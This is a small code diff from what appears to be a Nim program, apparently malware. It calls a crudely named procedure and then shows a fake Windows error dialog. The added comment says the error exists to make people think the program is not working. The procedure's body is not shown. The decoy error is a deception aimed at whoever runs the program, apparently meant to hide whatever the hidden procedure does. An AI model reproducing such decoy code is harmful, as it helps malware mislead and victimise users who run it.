@@ -177,6 +177,6 @@ proc femboyporn()=
 const meow = "(⁠≧⁠▽⁠≦⁠)" 
 
 femboyporn()
-MessageBox(0, "Error: Failure to find PTR at 0x000000078 .\nPlease make sure your Application is open at Execution", "Error", 0)
+MessageBox(0, "Error: Failure to find PTR at 0x000000078 .\nPlease make sure your Application is open at Execution", "Error", 0) # Fake Error Message to make ppl think its not Working ;D 
 
 
